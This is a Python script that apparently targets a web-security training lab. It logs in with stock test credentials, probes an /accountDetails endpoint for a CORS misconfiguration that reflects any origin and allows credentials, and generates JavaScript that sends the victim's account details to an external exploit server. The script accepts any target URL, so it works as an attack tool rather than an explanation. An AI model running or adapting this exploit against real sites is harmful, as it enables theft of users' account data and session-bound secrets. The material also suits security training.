import requests
from bs4 import BeautifulSoup

def login_and_get_session(base_url, username, password):
    """
    Tries to log in to the provided base URL using different possible login paths.
    
    Args:
        base_url (str): The base URL of the website.
        username (str): The username to use for logging in.
        password (str): The password to use for logging in.
    
    Returns:
        requests.Session: A session object if login is successful, otherwise None.
    """
    possible_login_paths = ['/login', '/user/login', '/signin', '/account/login']
    session = requests.Session()
    
    for login_path in possible_login_paths:
        login_url = base_url.rstrip('/') + login_path
        login_page = session.get(login_url)
        if login_page.status_code == 200:
            break
    else:
        return None

    soup = BeautifulSoup(login_page.content, 'html.parser')
    login_form = soup.find('form')
    if not login_form:
        return None

    form_data = {input_tag.get('name'): input_tag.get('value', '') for input_tag in login_form.find_all('input') if input_tag.get('name')}

    form_data.update({'username': username, 'password': password})

    headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'}
    response = session.post(login_url, data=form_data, headers=headers, allow_redirects=True)

    if response.status_code == 200 and 'session' in session.cookies:
        return session
    else:
        return None

def check_cors_vulnerability(session, url, evil_origin):
    """
    Checks if the given URL is vulnerable to CORS exploitation.
    
    Args:
        session (requests.Session): The session object to use for making the request.
        url (str): The URL to check for CORS vulnerability.
        evil_origin (str): The origin to use for testing CORS vulnerability.
    
    Returns:
        bool: True if the site is vulnerable, False otherwise.
    """
    headers = {'Origin': evil_origin, 'User-Agent': 'Mozilla/5.0'}
    try:
        response = session.get(url, headers=headers)
        cors_origin = response.headers.get('Access-Control-Allow-Origin')
        cors_credentials = response.headers.get('Access-Control-Allow-Credentials')

        if cors_origin and cors_credentials:
            if cors_origin == evil_origin and cors_credentials == 'true':
                return True
            else:
                return False
        else:
            return False
    except requests.RequestException as e:
        return False

def exploit_cors_vulnerability(lab_url, exploit_server_url):
    """
    Generates an HTML script to exploit a CORS vulnerability.
    
    Args:
        lab_url (str): The URL of the lab or site with the vulnerability.
        exploit_server_url (str): The URL of the server to send the stolen data to.
    
    Returns:
        str: A string containing the exploit HTML script.
    """
    exploit_html = f"""
    <script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','{lab_url}/accountDetails',true);
        req.withCredentials = true;
        req.send();

        function reqListener() {{
            location='{exploit_server_url}/log?key=' + this.responseText;
        }};
    </script>
    """
    return exploit_html

def check_and_exploit_cors(base_url):
    """
    Checks for CORS vulnerability and generates an exploit if the site is vulnerable.
    
    Args:
        base_url (str): The base URL of the site to check and exploit.
    
    Returns:
        list: A list of results and the exploit HTML if vulnerable.
    """
    username = "wiener"
    password = "peter"
    evil_origin = "https://example.com"
    exploit_server_url = "https://exploit-server.net"

    session = login_and_get_session(base_url, username, password)
    results = []

    if session:
        account_details_url = base_url.rstrip('/') + '/accountDetails'
        cors_vulnerable = check_cors_vulnerability(session, account_details_url, evil_origin)
        results.append(f"CORS Vulnerability Check: {'Vulnerable' if cors_vulnerable else 'Not Vulnerable'}")

        if cors_vulnerable:
            exploit_html = exploit_cors_vulnerability(base_url, exploit_server_url)
            results.append("Exploit HTML generated:")
            results.append(exploit_html)
    else:
        results.append("Login failed. Cannot perform further checks.")

    return results

if __name__ == "__main__":
    target_url = input('Enter the URL to test for CORS vulnerability: ')
    results = check_and_exploit_cors(target_url)
    for result in results:
        print(result)
